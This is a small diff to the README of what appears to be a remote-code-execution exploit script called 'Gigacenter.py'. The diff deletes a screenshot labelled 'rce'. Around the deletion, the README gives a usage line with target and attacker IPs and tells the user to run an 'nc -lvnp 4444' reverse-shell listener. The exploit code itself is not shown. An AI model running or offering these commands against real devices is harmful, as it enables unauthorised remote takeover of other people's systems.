@@ -39,7 +39,6 @@ python3 Gigacenter.py <TARGET_IP> <ATTACKER_IP> <ATTACKER_PORT>
 ```bash
 python3 Gigacenter.py 192.168.1.1 192.168.1.100 4444
 ```
-![rce](https://github.com/user-attachments/assets/d0a63983-5933-4214-a233-fb02c7256b82)
 
 Make sure to have `nc -lvnp 4444` running or let the script handle the listener itself.
 
